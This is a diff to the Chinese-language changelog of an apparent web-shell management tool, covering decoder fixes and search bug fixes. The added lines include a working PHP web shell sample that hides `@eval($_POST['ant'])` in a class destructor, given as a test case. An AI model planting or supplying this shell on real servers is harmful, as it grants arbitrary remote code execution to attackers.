@@ -12,6 +12,23 @@
 
 * 新增 PHP `base64`、`rot13` 解码器
 
+* 修复使用 `__destruct` 类型 shell 时 解码器不生效的 Bug (thx @scanf)
+
+> 取消 `register_shutdown_function` 改为显式调用 `asoutput`
+
+测试 Shell 如下:
+
+```
+<?php
+class Test{
+  function __destruct(){
+    @eval($_POST['ant']);
+  }
+}
+$test = new Test;
+?>
+```
+
 ### Shell 管理
 
 * 修复搜索数据时正则表达式输入错误导致crash 问题 #157
